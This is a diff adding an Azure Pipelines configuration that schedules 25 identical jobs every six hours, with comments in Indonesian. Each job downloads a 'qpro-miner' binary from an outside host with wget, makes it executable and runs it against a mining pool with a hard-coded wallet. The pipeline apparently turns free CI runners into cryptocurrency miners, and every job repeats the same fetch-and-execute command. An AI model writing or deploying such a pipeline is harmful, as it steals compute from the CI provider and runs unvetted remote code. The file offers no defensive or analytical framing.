@@ -1,0 +1,164 @@
+trigger:
+- main
+
+schedules:
+  - cron: "20 */6 * * *"   # Menjalankan pipeline setiap 6 jam pada menit 20 (6:20, 12:20, 18:20, 00:20 UTC)
+    displayName: "Run every 6 hours at 20 minutes past the hour"
+    branches:
+      include:
+        - main
+    always: true
+
+pool:
+  vmImage: 'ubuntu-22.04'  # Menggunakan Ubuntu 22.04 sebagai image
+
+jobs:
+- job: a
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: b
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: c
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: d
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: e
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: f
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: g
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: h
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: i
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: j
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: k
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: l
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: m
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: n
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: o
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: p
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: q
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: r
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: s
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: t
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: u
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: v
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: w
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: x
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
+
+- job: y
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner && ./qpro-miner --cpu --wallet SVNIAUSOXIZQOFNNXTETJWRSEPHCPFJKTLHGEKGQBBCDZLTNDZBJDLACROBF --worker proxy --url 188.166.59.251:443
